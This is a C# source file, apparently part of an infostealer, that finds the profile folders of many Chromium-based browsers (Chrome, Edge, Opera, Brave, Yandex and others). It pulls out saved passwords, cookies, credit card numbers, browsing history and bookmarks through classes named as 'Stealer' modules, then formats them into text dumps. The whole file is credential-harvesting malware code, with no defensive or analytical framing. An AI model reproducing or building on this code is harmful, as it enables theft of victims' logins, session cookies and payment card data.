using System.Collections.Generic;
using System;

public class ChromiumGrabber
{
    private static string DEFAULT_APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    private static string LOCAL_APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

    private static List<Tuple<ChromiumBasedBrowser, string>> Browsers = new List<Tuple<ChromiumBasedBrowser, string>>()
    {
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Opera, DEFAULT_APPDATA + "Opera Software\\Opera Stable"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.OperaGX, DEFAULT_APPDATA + "Opera Software\\Opera GX Stable"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Amigo, LOCAL_APPDATA + "Amigo"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Torch, LOCAL_APPDATA + "Torch"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Kometa, LOCAL_APPDATA + "Kometa"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Orbitum, LOCAL_APPDATA + "Orbitum"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.CentBrowser, LOCAL_APPDATA + "CentBrowser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.SevenStar, LOCAL_APPDATA + "7Star\\7Star"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Sputnik, LOCAL_APPDATA + "Sputnik\\Sputnik"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Vivaldi, LOCAL_APPDATA + "Vivaldi"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.ChromeSxS, LOCAL_APPDATA + "Google\\Chrome SxS"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.EpicPrivacyBrowser, LOCAL_APPDATA + "Google\\Epic Privacy Browser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Chrome, LOCAL_APPDATA + "Google\\Chrome"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Uran, LOCAL_APPDATA + "uCozMedia\\Uran"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Edge, LOCAL_APPDATA + "Microsoft\\Edge"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Yandex, LOCAL_APPDATA + "Yandex\\YandexBrowser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.OperaNeon, DEFAULT_APPDATA + "Opera Software\\Opera Neon"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Brave, LOCAL_APPDATA + "BraveSoftware\\Brave-Browser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Chromium, LOCAL_APPDATA + "Chromium"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Atom, LOCAL_APPDATA + "Mail.Ru\\Atom"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Dragon, LOCAL_APPDATA + "Comodo\\Dragon"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Slimjet, LOCAL_APPDATA + "Slimjet"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Browser360, LOCAL_APPDATA + "360Browser\\Browser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Maxthon3, LOCAL_APPDATA + "Maxthon3"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Nichrome, LOCAL_APPDATA + "Nichrome"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.CocCoc, LOCAL_APPDATA + "CocCoc\\Browser"),
        new Tuple<ChromiumBasedBrowser, string>(ChromiumBasedBrowser.Chromodo, LOCAL_APPDATA + "Chromodo")
    };

    private static string GetUserData(ChromiumBasedBrowser browser)
    {
        foreach (Tuple<ChromiumBasedBrowser, string> theBrowser in Browsers)
        {
            if (theBrowser.Item1.Equals(browser))
            {
                if (theBrowser.Item2.Contains("Opera Software"))
                {
                    return theBrowser.Item2 + "\\";
                }
                else
                {
                    return theBrowser.Item2 + "\\User Data\\";
                }
            }
        }

        return "";
    }

    private static string GetDefaultUserData(ChromiumBasedBrowser browser)
    {
        foreach (Tuple<ChromiumBasedBrowser, string> theBrowser in Browsers)
        {
            if (theBrowser.Item1.Equals(browser))
            {
                if (theBrowser.Item2.Contains("Opera Software"))
                {
                    return theBrowser.Item2 + "\\";
                }
                else
                {
                    return theBrowser.Item2 + "\\User Data\\Default\\";
                }
            }
        }

        return "";
    }

    public static string GetKeyPath(ChromiumBasedBrowser browser)
    {
        return GetUserData(browser) + "Local State";
    }

    public static string GetBookmarks(ChromiumBasedBrowser browser)
    {
        string BookmarkPath = GetDefaultUserData(browser) + "Bookmarks";

        if (!System.IO.File.Exists(BookmarkPath))
        {
            BookmarkPath = GetDefaultUserData(browser) + "\\Network\\Bookmarks";

            if (!System.IO.File.Exists(BookmarkPath))
            {
                return "";
            }
        }

        string bookmarks = "";

        foreach (BookmarkModel model in ChromiumBookmarksStealer.GetBookmarks(BookmarkPath))
        {
            string theStr = "================================================================================================\r\n" +
                "URL: " + model.URL + "\r\n" +
                "Title: " + model.Title + "\r\n" +
                "Data added UTC: " + model.DateAddedUTC;

            if (bookmarks == "")
            {
                bookmarks = theStr;
            }
            else
            {
                bookmarks += Environment.NewLine + theStr;
            }
        }

        if (bookmarks != "")
        {
            bookmarks += Environment.NewLine + "================================================================================================";
        }

        return bookmarks;
    }

    public static string GetHistory(ChromiumBasedBrowser browser)
    {
        string HistoryPath = GetDefaultUserData(browser) + "History";

        if (!System.IO.File.Exists(HistoryPath))
        {
            HistoryPath = GetDefaultUserData(browser) + "\\Network\\History";

            if (!System.IO.File.Exists(HistoryPath))
            {
                return "";
            }
        }

        string history = "";

        foreach (HistoryModel model in ChromiumHistoryStealer.GetHistory(HistoryPath))
        {
            string theStr = "================================================================================================\r\n" +
                "URL: " + model.URL + "\r\n" +
                "Title: " + model.Title + "\r\n" +
                "Last visit UTC: " + model.LastVisitUTC + "\r\n" +
                "Visit count: " + model.VisitCount;

            if (history == "")
            {
                history = theStr;
            }
            else
            {
                history += Environment.NewLine + theStr;
            }
        }

        if (history != "")
        {
            history += Environment.NewLine + "================================================================================================";
        }

        return history;
    }

    public static string GetCookies(ChromiumBasedBrowser browser, string keyPath)
    {
        string CookiePath = GetDefaultUserData(browser) + "Cookies";

        if (!System.IO.File.Exists(CookiePath))
        {
            CookiePath = GetDefaultUserData(browser) + "\\Network\\Cookies";

            if (!System.IO.File.Exists(CookiePath))
            {
                return "";
            }
        }

        string cookies = "";

        foreach (CookieModel model in ChromiumCookiesStealer.GetCookies(CookiePath, keyPath))
        {
            string theStr = "================================================================================================\r\n" +
                "Name: " + model.Name + "\r\n" +
                "Value: " + model.Value + "\r\n" +
                "Host: " + model.Host + "\r\n" +
                "Creation UTC: " + model.CreationUTC + "\r\n" +
                "Correct creation UTC: " + model.CorrectCreationUTC + "\r\n" +
                "Top frame site key: " + model.TopFrameSiteKey + "\r\n" +
                "Path: " + model.Path + "\r\n" +
                "Expires UTC: " + model.ExpiresUTC + "\r\n" +
                "Correct expires UTC: " + model.CorrectExpiresUTC + "\r\n" +
                "Is secure: " + model.IsSecure.ToString() + "\r\n" +
                "Is HTTP only: " + model.IsHTTPOnly.ToString() + "\r\n" +
                "Last access UTC: " + model.LastAccessUTC + "\r\n" +
                "Correct last access UTC: " + model.CorrectLastAccessUTC + "\r\n" +
                "Has expires: " + model.HasExpires.ToString() + "\r\n" +
                "Is persistent: " + model.IsPersistent.ToString() + "\r\n" +
                "Priority: " + model.Priority + "\r\n" +
                "Samesite: " + model.Samesite.ToString() + "\r\n" +
                "Source scheme: " + model.SourceScheme + "\r\n" +
                "Source port: " + model.SourcePort + "\r\n" +
                "Is same party: " + model.SameParty;

            if (cookies == "")
            {
                cookies = theStr;
            }
            else
            {
                cookies += Environment.NewLine + theStr;
            }
        }

        if (cookies != "")
        {
            cookies += Environment.NewLine + "================================================================================================";
        }

        return cookies;
    }

    public static string GetPasswords(ChromiumBasedBrowser browser, string keyPath)
    {
        string PasswordPath = GetDefaultUserData(browser) + "Login Data";

        if (!System.IO.File.Exists(PasswordPath))
        {
            PasswordPath = GetDefaultUserData(browser) + "\\Network\\Login Data";

            if (!System.IO.File.Exists(PasswordPath))
            {
                return "";
            }
        }

        string passwords = "";

        foreach (CredentialModel model in ChromiumPasswordsStealer.GetPasswords(PasswordPath, keyPath))
        {
            if (model.Username == null || model.Password == null || model.Url == null)
            {
                continue;
            }

            if (model.Username.Replace(" ", "").Replace('\t'.ToString(), "") == "" || model.Password.Replace(" ", "").Replace('\t'.ToString(), "") == "" || model.Url.Replace(" ", "").Replace('\t'.ToString(), "") == "")
            {
                continue;
            }

            string theStr = "================================================================================================" + Environment.NewLine + "Login (email / username): " + model.Username + Environment.NewLine + "Password: " + model.Password + Environment.NewLine + "URL: " + model.Url;

            if (passwords == "")
            {
                passwords = theStr;
            }
            else
            {
                passwords += Environment.NewLine + theStr;
            }
        }

        if (passwords != "")
        {
            passwords += Environment.NewLine + "================================================================================================";
        }

        return passwords;
    }

    public static string GetCreditCards(ChromiumBasedBrowser browser, string keyPath)
    {
        string CreditCardPath = GetDefaultUserData(browser) + "Web Data";

        if (!System.IO.File.Exists(CreditCardPath))
        {
            CreditCardPath = GetDefaultUserData(browser) + "\\Network\\Web Data";

            if (!System.IO.File.Exists(CreditCardPath))
            {
                return "";
            }
        }

        string creditCards = "";

        foreach (CreditCardModel model in ChromiumCreditCardsStealer.GetCreditCards(CreditCardPath, keyPath))
        {
            string theStr = "================================================================================================\r\n" +
                "Credit number: " + model.CardNumber + "\r\n" +
                "Name: " + model.Name + "\r\n" +
                "Expire month: " + model.ExpireMonth + "\r\n" +
                "Expire year: " + model.ExpireYear;

            if (creditCards == "")
            {
                creditCards = theStr;
            }
            else
            {
                creditCards += Environment.NewLine + theStr;
            }
        }

        if (creditCards != "")
        {
            creditCards += Environment.NewLine + "================================================================================================";
        }

        return creditCards;
    }
}